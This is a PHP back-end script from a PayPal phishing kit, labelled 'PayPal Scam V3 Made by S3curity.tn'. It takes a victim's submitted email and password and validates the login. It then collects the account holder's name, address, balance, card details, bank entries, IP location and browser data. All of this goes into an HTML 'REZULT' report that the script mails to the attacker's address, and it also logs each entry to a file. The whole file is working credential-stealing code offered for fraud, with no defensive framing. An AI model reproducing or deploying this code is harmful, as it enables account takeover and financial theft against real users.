<?php
include "../M_files/config.php";

if ($_POST['MAHDI_1']) {
	$ech = CheckLogin($_POST['MAHDI_1'],$_POST['MAHDI_2'],$HackerName);
	$ech = json_decode($ech, true);
	if ($ech["status"] == "true") {
		$ech["pp"] 			= generateRandomPP();
		$ech["ip"] 			= get_client_ip();
		$ech["email"] 		= $_POST['MAHDI_1'];
		$ech["pass"] 		= $_POST['MAHDI_2'];
		$ech["screenW"] 	= $_POST['MAHDI_W'];
		$ech["screenH"] 	= $_POST['MAHDI_H'];
		$ech["date"] 		= date('d-m-Y', time());
		$ech["time"] 		= date('H:i:s', time());
		$msg =  '<table  style="font-family:arial;border-collapse: collapse;border: 1px solid black;padding: 10px;" width="990px"><tr><td align="center"><img src="https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom.png"></td></tr><tr><td align="center"><b style="color:#009CDE; font-size:19px;">PayPal Login REZULT By '.$HackerName.'</b></td></tr><tr><td align="center"><b style="color:#002F86; font-size:18px;"> Dated : '.$ech["date"] .' at '.$ech["time"].'</b></td></tr><tr><td align="left"><table width="100%"><tr><td ><b style="color:#666; font-size:17px;">Hi '.$HackerName.', <br>Your victim\'s name : <b style="color:#009CDF;">'.$ech['fname'].' '.$ech['lname'].'</b><br>He have <b style="color:#009CDF;">'.$ech['numcard'].' Cards</b> & <b style="color:#009CDF;">'.$ech['bank'].' Bank accounts</b> & <b style="color:#009CDF;">'.$ech['balance'].'</b> Balance<br>He is in <b style="color:#009CDF;">'.$ech['ipcountry'].'</b> right now <br> His account is from <b style="color:#009CDF;">'.$ech['country'].'</b>.<br></b></td></tr><tr><td><table width="100%" style="color:#666; font-size:17px;font-weight:bold;"><tr><td width="30%">E-mail </td><td width="70%" style="border: 1px solid black;padding: 10px;">: '.$ech['email'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Password </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['pass'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Full Name </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['fname'].' '.$ech['lname'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Address </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['addres'].' '.$ech['city'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Zip </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['zip'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Country </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['country'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Balance </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['balance'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Number of cards </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Number of Banks </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bank'].'</td></tr>';
		switch ($ech['numcard']) {
			case 0:
				$msg .= '';
				break;
			case 1:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Card 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard1type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard1nums'].' || '.$ech['numcard1exp'].'</td></tr>';
				break;
			case 2:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Card 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard1type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard1nums'].' || '.$ech['numcard1exp'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Card 2 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard2type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard2nums'].' || '.$ech['numcard2exp'].'</td></tr>';
				break;
			case 3:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Card 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard1type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard1nums'].' || '.$ech['numcard1exp'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Card 2 </td><td style="border: 1px solid black;padding: 10px;">: <table>'.$ech['numcard2type'].' || XXXX-XXXX-XXXX-'.$ech['numcard2nums'].' || '.$ech['numcard2exp'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Card 3 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard3type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard3nums'].' || '.$ech['numcard3exp'].'</td></tr>';
				break;
			case 4:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Card 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard1type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard1nums'].' || '.$ech['numcard1exp'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Card 2 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard2type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard2nums'].' || '.$ech['numcard2exp'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Card 3 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard3type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard3nums'].' || '.$ech['numcard3exp'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Card 4 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['numcard4type'].'|| XXXX-XXXX-XXXX-'.$ech['numcard4nums'].' || '.$ech['numcard4exp'].'</td></tr>';
				break;
		}
		switch ($ech['bank']) {
			case 0:
				$msg .= '';
				break;
			case 1:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Bank 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin1'].'</td></tr>';
				break;
			case 2:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Bank 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin1'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Bank 2 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin2'].'</td></tr>';
				break;
			case 3:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Bank 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin1'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Bank 2 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin2'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Bank 3 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin3'].'</td></tr>';
				break;
			case 4:
				$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">Bank 1 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin1'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Bank 2 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin2'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Bank 3 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin3'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Bank 4 </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['bankin4'].'</td></tr>';
				break;
		}
		
		$msg .= '<tr><td style="border: 1px solid black;padding: 10px;">IP </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['ip'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Country of IP </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['ipcountry'].' ('.$ech['ipcode'].')</td></tr><tr><td style="border: 1px solid black;padding: 10px;">City of IP </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['ipcity'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Organization of IP </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['iporg'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">User Agent </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['userage'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Screen Resolution </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['screenW'].' * '.$ech['screenH'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">OS </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['os'].'</td></tr><tr><td style="border: 1px solid black;padding: 10px;">Browser </td><td style="border: 1px solid black;padding: 10px;">: '.$ech['browser'].'</td></tr></table></td></tr></table></td></tr><tr><td align="center"><b style="color:#002F86; font-size:19px;"> PayPal Scam V3 Made by S3curity.tn</b></td></tr>
		<tr><td align="center"><b style="color:#002F86; font-size:19px;"> '.$updates.'</b></td></tr></table>';
		$msg = wordwrap($msg,70);
		$_SESSION['ech'] = $ech;
		$sub = "S3curity.tn | PayPal Login | ".$ech["ip"]." | ".$ech['ipcode']." | ".$ech['email']."";
		$head = "MIME-Version: 1.0" . "\r\n";
		$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$head .= "From: V3.PayPal.Rez" . "\r\n";
		mail($HackerEmail,$sub,$msg,$head);
		$msg = "<b>".$ech['email']." </b> with <b>$ip</b> has finished from <b>Index</b> at <b>$time - $date</b>, Check your email for login<br>";
		$myFile = "../ips.html";
		$fh = fopen($myFile, 'a+') or die("can't open file");
		fwrite($fh, $msg);
		fclose($fh);
		echo "true";
	} else {
		echo "false";
	}
}

?>